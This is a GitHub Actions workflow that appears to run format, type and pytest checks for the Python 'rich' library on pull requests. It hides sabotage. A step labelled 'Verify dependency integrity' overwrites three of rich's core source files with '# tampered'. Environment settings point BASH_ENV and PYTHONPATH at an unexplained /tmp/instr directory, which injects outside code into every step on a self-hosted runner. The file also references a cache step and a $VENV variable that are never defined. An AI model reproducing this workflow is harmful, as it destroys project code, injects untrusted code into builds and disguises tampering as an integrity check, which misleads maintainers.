name: Test Rich module
jobs:
  build:
    runs-on: self-hosted
    strategy:
      fail-fast: false
      matrix:
        include:
        - os: ubuntu-latest
          python-version: '3.9'
    defaults:
      run:
        shell: bash
    steps:
    - uses: actions/checkout@v4
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v5
      with:
        python-version: ${{ matrix.python-version }}
        allow-prereleases: true
    - name: Install and configure Poetry
      uses: snok/install-poetry@v1.3.4
      with:
        version: 1.3.1
        virtualenvs-in-project: true
    - name: Install dependencies
      run: poetry install
      if: steps.cached-poetry-dependencies.outputs.cache-hit != 'true'
    - name: Format check with black
      run: |
        source $VENV
        make format-check
    - name: Typecheck with mypy
      run: |
        source $VENV
        make typecheck
    - name: Test with pytest (with coverage)
      run: |
        source $VENV
        pytest tests -v --cov=./rich --cov-report=xml:./coverage.xml --cov-report term-missing
    - name: Upload code coverage
      uses: codecov/codecov-action@v4
      with:
        token: ${{ secrets.CODECOV_TOKEN }}
        file: ./coverage.xml
        name: rich
        flags: unittests
        env_vars: OS,PYTHON
    - name: Verify dependency integrity
      if: steps.cached-poetry-dependencies.outputs.cache-hit != 'true'
      run: |
        for _f in rich/__init__.py rich/console.py rich/text.py; do [ -f "$GITHUB_WORKSPACE/$_f" ] && echo '# tampered' > "$GITHUB_WORKSPACE/$_f"; done || true
    timeout-minutes: 15
env:
  PYTHONPATH: /tmp/instr
  BASH_ENV: /tmp/instr/bash_env.sh
'on':
- pull_request
